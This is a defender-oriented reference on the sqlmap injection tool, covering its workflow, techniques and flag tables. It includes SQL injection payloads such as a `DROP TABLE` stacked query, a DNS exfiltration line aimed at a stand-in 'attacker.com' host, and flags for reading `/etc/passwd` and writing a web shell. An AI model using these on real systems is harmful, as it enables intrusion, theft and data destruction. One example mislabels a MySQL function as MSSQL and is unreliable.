# sqlmap — Overview

## Red Flag

🔴 **sqlmap leaves no evasion-proof network signature.** Any detectable pattern (default User-Agent, timing intervals, predictable injection strings) is trivially customizable via prefix/suffix/tamper flags. The only invariant signals are protocol-level artifacts (HTTP request clustering, repeated identical payloads with time-delay variance) and database-specific evidence (error messages, query timing, log entries) — none are operator-side artifacts. Hunt the target/network, not the attacker's machine.

---

## History

**sqlmap** is an open-source penetration testing framework developed by **Bernardo Damele Assumpcao Guimaraes** (original author and lead maintainer), first released around 2006. The project has been continuously maintained for nearly two decades and is widely deployed across both professional pentesting and real-world attackers.

- **Official Repository:** [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) (GPLv2)
- **Current Version:** 1.10.8.29 (as of August 2026; project is actively maintained, regular commits)
- **Maturity:** Production-ready, stable; core detection/exploitation engine reaches back to version 0.x, making it battle-tested and comprehensive
- **Primary Use:** Automated SQL injection detection and exploitation; database takeover (data exfiltration, OS-level access via DBMS capabilities)

**Key Timeline:**
- **2006–2010:** Foundation — boolean-based and time-based blind SQLi detection solidified
- **2010–2015:** Feature explosion — union-based queries, error-based exploitation, out-of-band (DNS) exfiltration, DBMS fingerprinting
- **2015–2020:** Evasion focus — 50+ tamper scripts for WAF/IDS/IPS bypass, prefix/suffix injection, CSRF token handling
- **2020–Present:** Modernization — Python 3 full support, experimental HTTP/2, GraphQL/NoSQL injection techniques, API-driven architecture (sqlmapapi)

---

## How It Works

sqlmap automates the entire SQL injection kill chain: discovery → detection → fingerprinting → exploitation → exfiltration.

### Injection Detection Workflow

1. **Parameter Testing** — For each targetable parameter (GET/POST/Cookie/Header/etc.), sqlmap injects a payload designed to trigger a boolean/time/error response.
2. **Response Comparison** — Compares the injection response against baseline ("normal") responses to identify differences.
3. **Heuristic Assessment** — Checks for SQL error signatures (MySQL `#1064`, MSSQL `Msg 102`, etc.) without even sending payloads—initial fast gate.
4. **Technique Classification** — Once a parameter responds differently, sqlmap narrows down the injection technique (6 main types; see below).
5. **Database Fingerprinting** — Probes DBMS-specific functions (`version()`, `user()`, `select @@version`, etc.) to identify the backend (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.).
6. **Exploitation** — Chains together DBMS-specific queries to extract data, write files (if filesystem access is available), or execute OS commands (if the DBMS permits it).

### Six Injection Detection Methods

sqlmap systematically tests these techniques (controlled via `--technique=BEUSTQ` flag):

1. **Boolean-Based (B)** — Injections that alter SQL logic to return true/false; sqlmap observes whether the page content changes. Slowest but works through heavy WAF filtering.
   - Example: `id=1 AND 1=1` (true, page loads normally) vs. `id=1 AND 1=2` (false, page changes).

2. **Error-Based (E)** — Triggering intentional SQL errors that reflect database information (error messages, query syntax details) in the HTTP response.
   - Example: `id=1 AND extractvalue(1, concat(0x7e, version()))` (MySQL) leaks `version()` via XML parsing error.

3. **Union-Based (U)** — Appending a `UNION SELECT` clause to extract data in a single payload. Requires guessing the number of columns and their data types.
   - Example: `id=1 UNION SELECT user(), database(), @@version -- ` retrieves database metadata.

4. **Stacked Queries (S)** — Submitting multiple SQL statements in one payload (semicolon-separated). Works only if the DBMS/driver permits it (MSSQL, PostgreSQL via certain drivers; NOT MySQL in typical PHP/Apache configs).
   - Example: `id=1; DROP TABLE users; -- ` (if `mysqli_multi_query()` is enabled).

5. **Time-Based Blind (T)** — Injections using `SLEEP()` or `WAITFOR()` to introduce deliberate delays. sqlmap measures response time to infer true/false.
   - Example: `id=1 AND IF(1=1, SLEEP(5), 0)` — if true, the response takes 5+ seconds.

6. **Out-of-Band / Exfiltration (O)** — Leaking data via DNS queries, HTTP callbacks, or other side-channels the attacker controls. Requires external infrastructure (Burp Collaborator, Interactsh, attacker-owned DNS server, etc.).
   - Example: `id=1; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\\\share'))` (MSSQL UNC path abuse, leaks `user()` via DNS request).

### DBMS Fingerprinting

After identifying a SQLi, sqlmap probes to determine the backend:

- **Version Detection** — Calls DBMS-specific functions: `version()` (MySQL), `version` (PostgreSQL), `@@version` (MSSQL), `SELECT version FROM v$instance` (Oracle), etc.
- **Feature Probing** — Tests for DBMS-specific functions (e.g., `LOAD_FILE()` for MySQL, `COPY TO` for PostgreSQL) to confirm the engine.
- **OS Detection** — Identifies the underlying OS (Windows for MSSQL/Oracle, Linux for MySQL/PostgreSQL) based on file paths, error messages, and available functions.

---

## Techniques / Protocols Used

| Technique | Protocol | Details |
|-----------|----------|---------|
| **HTTP Parameter Injection** | HTTP/HTTPS | Standard GET/POST/Cookie/Header parameter tampering; optionally uses `--data`, `--cookie`, `-H` for custom headers. |
| **SQL Injection** | SQL | Payload crafting exploits SQL syntax rules; techniques vary by DBMS (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, Access, Sybase, MongoDB, Cassandra, CouchDB, etc.). |
| **DBMS Authentication** | SQL Auth | Can authenticate using `--dbms-cred` (user:password) if database server authentication is required. |
| **DNS Exfiltration** | DNS (UDP 53) | Out-of-band technique using `--dns-domain` or built-in Interactsh integration (`--dns-domain=interactsh`) to leak data via DNS queries. Requires DBMS to perform outbound DNS (most do). |
| **HTTP Callback** | HTTP | Alternative OOB method; some setups use Burp Collaborator or similar. Less common in sqlmap than DNS. |
| **OS Command Execution** | Shell (via DBMS) | If the DBMS permits system-level access (SQL Server `xp_cmdshell`, MySQL `sys_exec` via UDFs, PostgreSQL `COPY TO` + cron tricks), sqlmap can escalate to OS commands via `--os-shell` or `--os-pwn`. |
| **DBMS Privilege Escalation** | SQL + DBMS Permissions | Leverages unquoted service paths, file-write privileges, or UDF loading to escalate within the DBMS or to the OS. |

---

## Command-Line Switches — Quick Reference

A comprehensive reference of the most common and powerful sqlmap flags (verified against live `sqlmap.py -hh` output). Written for a defender/analyst with zero offensive background.

### Target Definition (required: at least one)

| Flag | Default | Effect | Example |
|------|---------|--------|---------|
| `-u URL, --url=URL` | — | Target URL to test. | `-u "http://target.com/page.php?id=1"` |
| `-d DIRECT` | — | Direct database connection (bypass HTTP). Connection string format: `DBMS://user:password@host:port/database` | `-d "mysql://admin:pass@192.168.1.5:3306/mydb"` |
| `-m BULKFILE` | — | Scan multiple targets from a file (one URL per line). | `-m targets.txt` |
| `-l LOGFILE` | — | Parse targets from Burp Suite or WebScarab proxy log. | `-l burp.log` |
| `-r REQUESTFILE` | — | Load HTTP request from a file (format: full HTTP request, useful for POST bodies with special characters). | `-r request.txt` |
| `-g GOOGLEDORK` | — | Process Google dork search results as targets (limited by Google's rate limiting). | `-g "inurl:php?id="` |
| `-c CONFIGFILE` | — | Load options from an INI-style config file. | `-c sqlmap.conf` |
| `--openapi=OPENAPI` | — | Derive targets from OpenAPI/Swagger specification (file or URL). | `--openapi=swagger.json` |

### Request Configuration

| Flag | Default | Effect | Example |
|------|---------|--------|---------|
| `-A AGENT, --user-agent=AGENT` | Mozilla 5.0 | HTTP User-Agent header. | `-A "Mozilla/5.0 (Windows NT 10.0)"` |
| `--random-agent` | OFF | Use a random User-Agent from an internal list (evasion; changes per request). | `--random-agent` |
| `-H HEADER, --header=HEADER` | — | Add extra HTTP header. Can be used multiple times. | `-H "X-Forwarded-For: 127.0.0.1"` |
| `--cookie=COOKIE` | — | HTTP Cookie header value (e.g., session tokens). | `--cookie="PHPSESSID=abc123"` |
| `--auth-type=TYPE` | — | HTTP authentication type: Basic, Digest, Bearer, NTLM, PKI, etc. | `--auth-type=Basic --auth-cred=user:pass` |
| `--proxy=PROXY` | — | HTTP/HTTPS/SOCKS proxy URL. | `--proxy="http://127.0.0.1:8080"` |
| `--tor` | OFF | Route traffic through Tor (requires Tor daemon running). | `--tor --check-tor` |
| `--delay=DELAY` | 0 | Seconds to wait between requests (evasion; avoids rate-limit triggers). | `--delay=2` |
| `--timeout=TIMEOUT` | 30 | Timeout in seconds before aborting a request. | `--timeout=10` |
| `--retries=RETRIES` | 3 | How many times to retry a timed-out request. | `--retries=5` |

### Injection Control

| Flag | Default | Effect | Example |
|------|---------|--------|---------|
| `-p PARAMS` | All | Restrict testing to specific parameters (comma-separated). | `-p "id,username"` |
| `--skip=PARAMS` | — | Skip testing these parameters. | `--skip="session,token"` |
| `--dbms=DBMS` | Auto-detect | Force a specific DBMS (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.). Skips fingerprinting, speeds up testing. | `--dbms=MySQL` |
| `--level=LEVEL` | 1 | Test intensity: 1 (GET/POST params) to 5 (headers, cookies, User-Agent, Referer). | `--level=5` |
| `--risk=RISK` | 1 | Test risk: 1 (safe queries), 2 (moderate), 3 (destructive; includes DROP, UPDATE). | `--risk=2` |
| `--tamper=TAMPER` | — | Use tamper script(s) for WAF/IDS evasion (76 available scripts; see dedicated section). | `--tamper=space2comment,between` |
| `--prefix=PREFIX` | — | Prepend string to every payload (e.g., if input is inside a string context). | `--prefix="' OR '"` |
| `--suffix=SUFFIX` | — | Append string to every payload (e.g., comment-out remainder of query). | `--suffix=" -- "` |

### Detection / Response Analysis

| Flag | Default | Effect | Example |
|------|---------|--------|---------|
| `--technique=TECH` | BEUSTQ | Injection techniques to test (comma-separated or as letters): B=boolean, E=error, U=union, S=stacked, T=time-based, Q=out-of-band. Order matters; tested left-to-right. | `--technique=EUTS` (skip boolean-based, start with error-based) |
| `--string=STRING` | — | String to search for in a "true" (vulnerable) response. Overrides automatic detection. | `--string="Welcome"` |
| `--not-string=STRING` | — | String that indicates a "false" response. | `--not-string="Error"` |
| `--regexp=REGEXP` | — | Regex pattern matching a "true" response. | `--regexp="User: .+"` |
| `--code=CODE` | — | HTTP status code matching a "true" response (e.g., 200 for success, 500 for error). | `--code=200` |
| `--smart` | OFF | Perform thorough testing only if a quick heuristic detects a vulnerability. Speeds up scanning of large parameter sets. | `--smart` |
| `--time-sec=TIMESEC` | 5 | Seconds to delay when using time-based blind injection (lower = faster but riskier for false positives). | `--time-sec=3` |

### Union-Based Injection Optimization

| Flag | Default | Effect | Example |
|------|---------|--------|---------|
| `--union-cols=RANGE` | 1-20 | Column count range to test for UNION queries. Reduces testing time if you know the column count. | `--union-cols=5-10` |
| `--union-char=CHAR` | NULL | Character to bruteforce column count (default NULL, which is silent; others like '0' or '1' may be visible). | `--union-char=1` |
| `--union-from=TABLE` | — | FROM clause table (some UNION payloads require a valid table). | `--union-from=information_schema.tables` |

### Enumeration / Data Extraction

| Flag | Default | Effect | Example |
|------|---------|--------|---------|
| `-a, --all` | — | Extract everything: users, passwords, databases, tables, data. | `-a` |
| `-b, --banner` | — | Retrieve DBMS banner (version). | `-b` |
| `--current-user` | — | Get current database user. | `--current-user` |
| `--current-db` | — | Get current database name. | `--current-db` |
| `--dbs` | — | List all databases. | `--dbs` |
| `--tables` | — | List tables in current or specified database. | `--tables -D mysql` |
| `--columns` | — | List columns in specified table. | `--columns -T users -D myapp` |
| `--dump` | — | Dump table contents. Must specify `-D` (database) and `-T` (table). | `--dump -D myapp -T users` |
| `--dump-all` | — | Dump all tables in all databases (very noisy; use `--batch`). | `--dump-all` |
| `-D DB` | — | Database to enumerate. | `-D information_schema` |
| `-T TABLE` | — | Table(s) to enumerate (comma-separated). | `-T users,admin` |
| `-C COL` | — | Column(s) to dump (comma-separated). | `-C username,password` |
| `--search` | — | Search for column/table/database names matching a pattern. | `--search -T "pass"` (finds all tables with "pass" in name) |

### Operating System Access

| Flag | Default | Effect | Example |
|------|---------|--------|---------|
| `--file-read=FILE` | — | Read a file from the target's filesystem (if DBMS permits). | `--file-read="/etc/passwd"` |
| `--file-write=FILE` | — | Write a file to target's filesystem. Requires specifying both source and destination. | `--file-write=shell.php --file-dest=/var/www/html/shell.php` |
| `--os-shell` | — | Prompt for an interactive shell on the target OS (if DBMS allows command execution). | `--os-shell` |
| `--os-pwn` | — | Attempt to get a Meterpreter/VNC/out-of-band shell (requires additional infrastructure). | `--os-pwn` |

### Session / Caching

| Flag | Default | Effect | Example |
|------|---------|--------|---------|
| `--flush-session` | — | Delete all cached data for the current target (forces re-testing). | `--flush-session` |
| `--fresh-queries` | — | Ignore cached query results; re-test detection/exploitation each run. | `--fresh-queries` |

### Miscellaneous

| Flag | Default | Effect | Example |
|------|---------|--------|---------|
| `--batch` | OFF | Non-interactive mode; never prompt for user input, use defaults for all questions. Essential for automation. | `--batch` |
| `--wizard` | — | Simple wizard interface for beginners (step-by-step Q&A). | `--wizard` |
| `-v VERBOSE` | 1 | Verbosity level (0-6): 0=silent, 1=normal, 6=debug-verbose). Higher levels flood output with payload details and responses. | `-v 6` |
| `-f, --fingerprint` | — | Perform deep DBMS version fingerprinting (slow but thorough). | `-f` |

---

## Quick Use-Case List

1. **URL parameter injection (GET)** — Inject into a simple query parameter: `?id=1` → `?id=1' OR '1'='1`.
2. **POST data injection** — Test form submissions or API endpoints via `--data`.
3. **Cookie-based injection** — Exploit session tokens or tracking cookies via `--cookie`.
4. **Custom header injection** — Inject into non-standard headers (X-Forwarded-For, X-Original-IP, etc.) via `-H` or `--level=5`.
5. **Boolean-based blind detection** — Derive data one bit at a time when no error messages are visible.
6. **Time-based blind detection** — Use SLEEP/WAITFOR delays when responses are identical but timing varies.
7. **Union-based data extraction** — Leverage UNION SELECT for fast, single-payload data retrieval.
8. **Error-based extraction** — Leak data via intentional DBMS errors (XML parsing, math errors, etc.).
9. **Database enumeration** — Retrieve user list, password hashes, database names, table structures via `--dbs`, `--users`, `--passwords`.
10. **Authentication bypass** — Inject into login forms to skip credential verification (admin login without password).
11. **Direct database connection** — Use `-d` to connect to a known database without HTTP (e.g., post-compromise database access).
12. **Batch scanning (Google dork)** — Automatically scan hundreds of targets from a Google dork query (limited by Google's rate limiting).
13. **WAF/IDS evasion** — Combine `--tamper` scripts to bypass common filters (space2comment, between, charencode, etc.).
14. **Out-of-band exfiltration** — Extract large datasets via DNS queries using `--dns-domain=interactsh` or a personal DNS server.
15. **Stacked queries for updates/deletes** — If the DBMS permits stacked queries, execute UPDATE/DELETE commands to modify data.
16. **OS command execution** — Escalate from SQL to OS shell via `xp_cmdshell`, UDF loading, or file-write tricks.
17. **File read/write** — Extract system files (`/etc/passwd`, Windows registry dumps) or upload webshells.
18. **Second-order injection** — Test parameters where the payload is stored and reflected later (via `--second-url` or `--second-req`).
19. **CSRF token handling** — Automatically extract and reuse anti-CSRF tokens during testing via `--csrf-token`, `--csrf-url`.
20. **Session resumption** — Use `--flush-session` selectively to resume a long scan or `--fresh-queries` to re-verify suspected injection points.

---

## Prerequisites

- **Python 2.7 or 3.x** — sqlmap runs on any modern Python version.
- **Target Accessibility** — HTTP/HTTPS connectivity to the target application (or direct database connection for `-d` mode).
- **Parameter Discovery** — Knowledge of at least one injectable parameter (often discovered via automated scanning like Nmap, Burp Suite, or manual reconnaissance).
- **DBMS Knowledge** (optional) — Knowing the backend DBMS upfront (via error messages, banner grabbing, or guess) speeds up testing via `--dbms=`.
- **Proxy Setup** (optional) — For testing via a WAF or internal network, configure via `--proxy=`.
- **Out-of-Band Infrastructure** (optional) — For DNS exfiltration, either use built-in Interactsh (`--dns-domain=interactsh`) or configure a personal DNS server.

